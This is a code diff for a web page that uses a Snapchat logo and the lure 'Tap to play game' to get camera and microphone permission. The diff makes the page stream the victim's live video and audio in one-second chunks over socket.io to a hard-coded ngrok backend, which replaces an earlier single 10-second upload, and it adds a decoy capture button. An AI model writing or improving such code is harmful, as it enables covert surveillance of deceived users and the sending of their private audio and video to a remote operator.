@@ -22,6 +22,7 @@ body {
   align-items: center;
   justify-content: center;
   flex-direction: column;
+  z-index: 1000;
 }
 
 /* Logo */
@@ -46,6 +47,7 @@ body {
   background: black;
   color: white;
   font-size: 16px;
+  cursor: pointer;
 }
 
 /* Error message */
@@ -53,6 +55,8 @@ body {
   margin-top: 10px;
   color: red;
   font-size: 14px;
+  text-align: center;
+  padding: 0 20px;
 }
 
 /* Camera */
@@ -75,6 +79,12 @@ body {
   background: white;
   border: 5px solid rgba(255,255,255,0.5);
   display: none;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+.capture-btn:active {
+  transform: translateX(-50%) scale(0.95);
 }
 </style>
 </head>
@@ -83,28 +93,22 @@ body {
 
 <!-- 🟡 Splash Screen -->
 <div id="splash">
-
-  <!-- ✅ Your downloaded logo -->
-  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo">
-
+  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo" onerror="this.src='https://via.placeholder.com/120?text=Snap'">
   <div id="tap">Tap to play game</div>
-
   <button id="startBtn" onclick="startApp()">Start</button>
-
   <div id="message"></div>
-
 </div>
 
 <!-- 📸 Camera -->
-<video id="camera" autoplay playsinline></video>
+<video id="camera" autoplay playsinline muted></video>
 
 <!-- Capture UI -->
-<div class="capture-btn"></div>
+<div class="capture-btn" onclick="captureVideo()"></div>
 
 <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
 
 <script>
-// 🔌 Backend URL
+// 🔌 Backend URL - Update this with your ngrok URL
 const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";
 
 const socket = io(BACKEND_URL, {
@@ -112,7 +116,7 @@ const socket = io(BACKEND_URL, {
 });
 
 let mediaRecorder;
-let recordedChunks = [];
+let stream = null;
 
 function startApp() {
   const splash = document.getElementById("splash");
@@ -121,59 +125,32 @@ function startApp() {
   const msg = document.getElementById("message");
 
   navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-    .then(stream => {
-
+    .then(mediaStream => {
+      stream = mediaStream;
       msg.innerText = "";
 
+      // Show camera
       camera.srcObject = stream;
       camera.style.display = "block";
       btn.style.display = "block";
       splash.style.display = "none";
 
-      // Find supported mimeType
-      const mimeTypes = [
-        'video/webm;codecs=vp9,opus',
-        'video/webm;codecs=vp8,opus',
-        'video/webm'
-      ];
-      
-      let mimeType = 'video/webm';
-      for (const type of mimeTypes) {
-        if (MediaRecorder.isTypeSupported(type)) {
-          mimeType = type;
-          break;
-        }
-      }
+      // 🎥 Start backend streaming
+      socket.emit('start-stream');
 
       mediaRecorder = new MediaRecorder(stream, {
-        mimeType: mimeType
+        mimeType: 'video/webm'
       });
 
       mediaRecorder.ondataavailable = (event) => {
-        if (event.data && event.data.size > 0) {
-          recordedChunks.push(event.data);
+        if (event.data.size > 0) {
+          socket.emit('stream-data', event.data);
         }
       };
 
-      mediaRecorder.onstop = async () => {
-        if (recordedChunks.length > 0) {
-          const blob = new Blob(recordedChunks, { type: mimeType });
-          const buffer = await blob.arrayBuffer();
-          socket.emit('video-data', buffer);
-          recordedChunks = [];
-        }
-      };
+      mediaRecorder.start(1000);
 
-      // Start recording, collect all data at once
-      mediaRecorder.start();
-      
-      // Stop after 10 seconds
-      setTimeout(() => {
-        if (mediaRecorder && mediaRecorder.state === 'recording') {
-          mediaRecorder.stop();
-        }
-      }, 10000);
-
+      // Stop safely on page close
       window.onbeforeunload = () => {
         if (mediaRecorder && mediaRecorder.state === 'recording') {
           mediaRecorder.stop();
@@ -181,6 +158,7 @@ function startApp() {
         if (stream) {
           stream.getTracks().forEach(track => track.stop());
         }
+        socket.emit('stop-stream');
       };
 
     })
@@ -189,6 +167,18 @@ function startApp() {
       msg.innerText = "⚠️ Please allow camera to play this game";
       document.getElementById("startBtn").innerText = "Try Again";
     });
+}
+
+function captureVideo() {
+  // This function is called when the circle button is clicked
+  // You can add custom logic here if needed
+  console.log("Capture button clicked");
+  // Visual feedback
+  const btn = document.querySelector(".capture-btn");
+  btn.style.transform = "translateX(-50%) scale(0.95)";
+  setTimeout(() => {
+    btn.style.transform = "translateX(-50%) scale(1)";
+  }, 200);
 }
 </script>
 
